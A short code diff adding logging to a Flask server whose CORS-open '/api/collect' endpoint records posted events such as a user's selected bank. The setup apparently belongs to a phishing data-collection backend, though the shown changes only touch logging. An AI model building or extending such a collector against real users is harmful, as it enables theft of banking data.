@@ -1,21 +1,28 @@
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import datetime
+import sys
 
 app = Flask(__name__)
 CORS(app)
 
 def log(msg):
-    print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    line = f"[{timestamp}] {msg}"
+    print(line)
+    sys.stdout.flush()
 
 @app.route('/', methods=['GET'])
 def home():
+    log("ROOT: Server pinged")
     return jsonify({'status': 'ok', 'message': 'Server is running'})
 
 @app.route('/api/collect', methods=['POST'])
 def collect():
     data = request.json
     msg_type = data.get('type')
+    
+    log(f"=== NEW REQUEST: {msg_type} ===")
 
     if msg_type == 'bank_selected':
         log(f"BANK: {data.get('bankName')} ({data.get('bank')})")
